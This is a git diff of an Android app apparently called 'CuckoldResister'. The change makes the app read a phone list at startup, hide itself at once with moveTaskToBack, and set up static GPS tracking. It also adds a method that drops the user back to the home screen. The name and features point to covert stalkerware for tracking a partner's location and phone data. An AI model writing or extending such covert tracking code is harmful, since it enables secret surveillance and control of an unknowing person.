@@ -2,6 +2,7 @@ package com.Sven.CuckoldResister.CuckoldResister;
 
 import android.content.ContentValues;
 import android.content.Context;
+import android.content.Intent;
 import android.database.Cursor;
 import android.location.Location;
 import android.net.Uri;
@@ -34,8 +35,8 @@ public class MainActivity extends AppCompatActivity {
     private String DisplayMessage = "";
     private static GPSTracker gps;
     public static String address;
-    public Location location;
-    private Context mContext;
+    public static Location location;
+    private static Context mContext;
 
     Button sendBtn;
     Button displayBtn;
@@ -46,7 +47,7 @@ public class MainActivity extends AppCompatActivity {
     static TextView displayTextView;
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
+    protected void onCreate(Bundle savedInstanceState)  {
 
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
@@ -85,15 +86,23 @@ public class MainActivity extends AppCompatActivity {
 
         gPSBtn.setOnClickListener(new View.OnClickListener() {
             public void onClick(View view) {
-                displayGPS();
+                DisplayGPS();
             }
         });
 
-        displayGPS();
+        ReadPhoneList();
+
+        moveTaskToBack(true);
+        //MinimizeApplication();
 
     }
 
-    public void displayGPS() {
+    public static void  InitGPS(){
+        gps = new GPSTracker(mContext);
+        Toast.makeText(mContext, "INIT GPS DONE", Toast.LENGTH_SHORT).show();
+    }
+
+    public void DisplayGPS() {
         gps = new GPSTracker(MainActivity.this);
 
         if (gps.canGetLocation()) {
@@ -250,6 +259,12 @@ public class MainActivity extends AppCompatActivity {
 
     public double[] getGPS() {
         if (gps.canGetLocation()) {
+            if(gps.getLatitude()==0.0){
+                double[] dl = new double[2];
+                dl[0] = 0.0;
+                dl[1] = 0.0;
+                return dl;
+            }
             double latitude = gps.getLatitude();
             double longitude = gps.getLongitude();
             Log.d("sven", "mainActivity: " + latitude + "|||" + longitude);
@@ -332,6 +347,17 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             Log.d("sven", e.toString());
         }
+    }
+
+    public static Context getmContext(){
+        return mContext;
+    }
+
+    public void MinimizeApplication(){
+        Intent small = new Intent(Intent.ACTION_MAIN);
+        small.addCategory(Intent.CATEGORY_HOME);
+        small.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(small);
     }
 
 }
